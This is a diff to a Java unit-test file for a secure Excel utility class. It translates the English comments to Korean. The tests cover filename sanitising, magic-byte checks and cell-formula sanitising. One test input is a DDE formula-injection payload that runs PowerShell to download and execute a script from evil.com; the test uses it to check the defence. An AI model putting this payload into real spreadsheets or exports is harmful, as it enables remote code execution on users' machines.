@@ -22,7 +22,7 @@ class SecureExcelUtilsTest {
 
   @TempDir Path tempDir;
 
-  // ========== sanitizeFilename tests ==========
+  // ========== sanitizeFilename 테스트 ==========
 
   @ParameterizedTest
   @NullSource
@@ -124,7 +124,7 @@ class SecureExcelUtilsTest {
     assertThat(result).doesNotContain("<", ">", ":", "\"", "|", "?", "*");
   }
 
-  // ========== validateFileContent tests ==========
+  // ========== validateFileContent 테스트 ==========
 
   @Test
   void validateFileContent_validXlsx_passes() throws IOException {
@@ -144,9 +144,9 @@ class SecureExcelUtilsTest {
 
   @Test
   void validateFileContent_xlsxWithWrongMagicBytes_throwsSecurityException() throws IOException {
-    // Create a file with .xlsx extension but PDF content
+    // .xlsx 확장자지만 PDF 내용인 파일 생성
     Path fakeXlsx = tempDir.resolve("fake.xlsx");
-    Files.write(fakeXlsx, new byte[] {0x25, 0x50, 0x44, 0x46}); // %PDF magic bytes
+    Files.write(fakeXlsx, new byte[] {0x25, 0x50, 0x44, 0x46}); // %PDF 매직 바이트
 
     assertThatThrownBy(() -> SecureExcelUtils.validateFileContent(fakeXlsx))
         .isInstanceOf(SecurityException.class)
@@ -156,7 +156,7 @@ class SecureExcelUtilsTest {
   @Test
   void validateFileContent_tooSmallFile_throwsIOException() throws IOException {
     Path tinyFile = tempDir.resolve("tiny.xlsx");
-    Files.write(tinyFile, new byte[] {0x50}); // Only 1 byte
+    Files.write(tinyFile, new byte[] {0x50}); // 1바이트만 존재
 
     assertThatThrownBy(() -> SecureExcelUtils.validateFileContent(tinyFile))
         .isInstanceOf(IOException.class)
@@ -165,7 +165,7 @@ class SecureExcelUtilsTest {
 
   @Test
   void validateFileContent_xlsxContainingXlsContent_throwsSecurityException() throws IOException {
-    // Create a file with .xlsx extension but XLS magic bytes
+    // .xlsx 확장자지만 XLS 매직 바이트인 파일 생성
     Path mixedFile = tempDir.resolve("mixed.xlsx");
     Files.write(
         mixedFile,
@@ -176,7 +176,7 @@ class SecureExcelUtilsTest {
         .hasMessageContaining("XLSX");
   }
 
-  // ========== validateStreamContent tests ==========
+  // ========== validateStreamContent 테스트 ==========
 
   @Test
   void validateStreamContent_validXlsxStream_passes() throws IOException {
@@ -209,7 +209,7 @@ class SecureExcelUtilsTest {
 
   @Test
   void validateStreamContent_tooSmallStream_throwsSecurityException() throws IOException {
-    byte[] tinyContent = {0x50, 0x4B}; // Only 2 bytes
+    byte[] tinyContent = {0x50, 0x4B}; // 2바이트만 존재
     ByteArrayInputStream stream = new ByteArrayInputStream(tinyContent);
 
     assertThatThrownBy(() -> SecureExcelUtils.validateStreamContent(stream, "xlsx"))
@@ -217,7 +217,7 @@ class SecureExcelUtilsTest {
         .hasMessageContaining("too small");
   }
 
-  // ========== sanitizeForExcelCell tests ==========
+  // ========== sanitizeForExcelCell 테스트 ==========
 
   @Test
   void sanitizeForExcelCell_null_returnsNull() {
@@ -287,7 +287,7 @@ class SecureExcelUtilsTest {
 
   @Test
   void sanitizeForExcelCell_ddeAttackPayload_prefixedWithQuote() {
-    // DDE (Dynamic Data Exchange) attack payload
+    // DDE(Dynamic Data Exchange) 공격 페이로드
     String input =
         "=cmd|'/C powershell -ep bypass -noprofile -command \"IEX((New-Object Net.WebClient).DownloadString('http://evil.com/script.ps1'))\"'!A0";
     String result = SecureExcelUtils.sanitizeForExcelCell(input);
@@ -302,7 +302,7 @@ class SecureExcelUtilsTest {
     assertThat(result).startsWith("'");
   }
 
-  // ========== countRows tests ==========
+  // ========== countRows 테스트 ==========
 
   @Test
   void countRows_returnsCorrectCount() throws IOException {
@@ -310,7 +310,7 @@ class SecureExcelUtilsTest {
 
     int count = SecureExcelUtils.countRows(file, 0);
 
-    // 1 header row + 25 data rows = 26 total row elements
+    // 헤더 1행 + 데이터 25행 = 총 row 요소 26개
     assertThat(count).isEqualTo(26);
   }
 
@@ -330,11 +330,11 @@ class SecureExcelUtilsTest {
   @Test
   void countRows_selectsCorrectSheet() throws IOException {
     try (XSSFWorkbook wb = new XSSFWorkbook()) {
-      // Sheet 0: 3 rows
+      // 시트 0: 3행
       Sheet s0 = wb.createSheet("Sheet0");
       for (int i = 0; i < 3; i++) s0.createRow(i).createCell(0).setCellValue(i);
 
-      // Sheet 1: 7 rows
+      // 시트 1: 7행
       Sheet s1 = wb.createSheet("Sheet1");
       for (int i = 0; i < 7; i++) s1.createRow(i).createCell(0).setCellValue(i);
 
@@ -357,7 +357,7 @@ class SecureExcelUtilsTest {
         .hasMessageContaining("Sheet index");
   }
 
-  // ========== createWorkbook tests ==========
+  // ========== createWorkbook 테스트 ==========
 
   @Test
   void createWorkbook_validXlsxFile_returnsWorkbook() throws IOException {
@@ -397,7 +397,7 @@ class SecureExcelUtilsTest {
     }
   }
 
-  // ========== Helper methods ==========
+  // ========== 헬퍼 메서드 =========
 
   private Path createValidXlsxFile() throws IOException {
     try (XSSFWorkbook wb = new XSSFWorkbook()) {
